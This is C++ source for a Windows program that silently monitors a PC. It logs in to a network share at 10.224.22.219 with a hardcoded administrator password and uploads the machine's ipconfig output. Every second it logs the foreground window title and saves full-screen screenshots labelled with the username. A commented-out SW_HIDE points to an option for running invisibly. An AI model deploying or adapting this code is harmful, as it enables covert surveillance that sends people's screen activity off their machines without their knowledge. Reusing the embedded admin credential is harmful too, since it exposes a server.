#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <atlimage.h>
#include <time.h>
#include <winbase.h>
#include <direct.h>
#include <conio.h>
#include <windows.h>
#include <Lmcons.h>
#include <fstream>
using namespace std;
static TCHAR szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
static DWORD dwSize = MAX_COMPUTERNAME_LENGTH + 1;
static TCHAR username[UNLEN + 1];
static DWORD username_len = UNLEN + 1;

CString GetTime(CString PCName)
{
	time_t t = time(0);
	struct tm* now = localtime(&t);
	char folderdate[80];
	char flodertime[80];
	char timename[80];
	strftime(folderdate, 80, "%Y年%m月%d日", now);
	strftime(flodertime, 80, "%m月%d日%H時", now);
	strftime(timename, 80, "IMG-%H%M%S", now);
	CString PathPCName = L"\\\\10.224.22.219\\Screen\\" + PCName;
	CString FoldernameDate = L"\\\\10.224.22.219\\Screen\\" + PCName + "\\" + folderdate;
	CString FoldernameTime = L"\\\\10.224.22.219\\Screen\\" + PCName + "\\" + folderdate + "\\" + flodertime;
	CString totalename = L"\\\\10.224.22.219\\Screen\\" + PCName + "\\" + folderdate + "\\" + flodertime + "\\" + timename + ".jpg";
	CW2A CPathPCName(PathPCName);
	CW2A CFolderDate(FoldernameDate);
	CW2A CFoldernameTime(FoldernameTime);
	if (_mkdir(CPathPCName) == 0);
	if (_mkdir(CFolderDate) == 0);
	if (_mkdir(CFoldernameTime) == 0);
	return totalename;
}

void ScreenShot(LPCTSTR s, CString UserName)
{
	POINT pt;
	BOOL bReturn = GetCursorPos(&pt);
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	HDC hdcMem = CreateCompatibleDC(hdc);
	CImage image;
	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	int heigth = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	HBITMAP hbitmap(NULL);
	hbitmap = CreateCompatibleBitmap(hdc, width, heigth);
	SelectObject(hdcMem, hbitmap);
	BitBlt(hdcMem, 0, 0, width, heigth, hdc, 0, 0, SRCCOPY);
	int nBitPerPixel = GetDeviceCaps(hdcMem, BITSPIXEL);
	image.Create(width, heigth, nBitPerPixel);
	HICON hIcon;
	hIcon = (HICON)LoadImage(NULL, L"C:\\Windows\\Cursors\\aero_arrow_l.cur", IMAGE_ICON, 0, 0, LR_LOADFROMFILE | LR_DEFAULTSIZE | LR_SHARED);
	DrawIcon(hdcMem, pt.x, pt.y, hIcon);
	RECT textlocation = { 0, 1020, 1920, 1080 };
	DrawText(hdcMem, UserName, -1, &textlocation, DT_BOTTOM);
	BitBlt(image.GetDC(), 0, 0, width, heigth, hdcMem, 0, 0, SRCCOPY);
	DeleteDC(hdc);
	DeleteDC(hdcMem);
	DeleteObject(hbitmap);
	ReleaseDC(hwnd, hdcMem);
	image.ReleaseDC();
	image.Save(s, Gdiplus::ImageFormatJPEG);
}

int mouseposition() {
	POINT pt;
	BOOL bReturn = GetCursorPos(&pt);
	int x = pt.x, y = pt.y;
	return x + y;
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);//SW_HIDE
	GetComputerName(szBuffer, &dwSize);
	GetUserName(username, &username_len);
	CString PCName = szBuffer;
	CString ipsavepath = L"ipconfig /all > \\\\10.224.22.219\\Screen\\" + PCName + "\\" + "ip.txt";
	system("NET USE \\\\10.224.22.219 /user:fileserver19\\administrator !qaz2wsx");
	CW2A ipsave(ipsavepath);
	system(ipsave);
	int mouse = NULL;
	while (true)
	{
		char name[100];
		HWND hwnd = GetForegroundWindow();
		GetWindowTextA(hwnd, name, 100);
		cout << name << endl;
		ofstream outfile(L"\\\\10.224.22.219\\Screen\\" + PCName + "\\" + "當前前景.txt");
		outfile << name << endl;
		outfile.close();
		
		if (mouseposition() == mouse)
		{
			ofstream outfile(L"\\\\10.224.22.219\\Screen\\" + PCName + "\\"+ "閒置前景.txt");
			outfile << name << endl;
			outfile.close();
		}else{
			CString totalename = GetTime(szBuffer);
			ScreenShot((LPCTSTR)(CString)totalename, username);
			mouse = mouseposition();
		}
		Sleep(1000);
	}
	return 0;
}